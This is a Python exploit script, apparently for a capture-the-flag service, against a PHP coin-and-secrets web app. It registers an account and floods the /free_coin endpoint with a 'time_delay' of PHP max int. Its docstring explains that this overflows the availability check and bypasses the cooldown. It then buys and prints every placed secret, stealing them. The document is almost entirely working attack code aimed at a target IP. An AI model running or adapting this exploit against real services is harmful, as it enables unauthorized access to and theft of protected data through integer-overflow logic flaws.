import json
import sys
import time

import requests

"""
    Rationale: /free_coin can take one additional argument, "time_delay", which affects the time when another coin is 
    available. Availability time is evaluated to intval(time() + $time_delay) (FreeCoinController:29), which can go negative and pass
    `if(time() >= $latest_block->when_available)` (FreeCoinController:33)
"""

ip = sys.argv[1] if len(sys.argv) > 1 else "localhost"
url = f"http://{ip}:9999"

account = "nagibator227"

requests.post(url + "/register", {
    "account": account
})

latest = json.loads(requests.get(url + "/placed_secrets").text)["result"]["data"]

magic_number = 9223372036854775807  # PHP max int :)
for each in latest:
    price = int(each["price"])

    for _ in range(price):
        print(requests.post(url + "/free_coin", {
            "account": account,
            "time_delay": magic_number
        }).text)

        """
         Average round time is bigger than 60 seconds, we don't really need to rush it even if price is 60
        """
        time.sleep(0.2)

    result = requests.post(url + "/buy_secret", {"account": account, "secret_id": each["id"]}).text
    print(json.loads(result)["result"]["secret"])

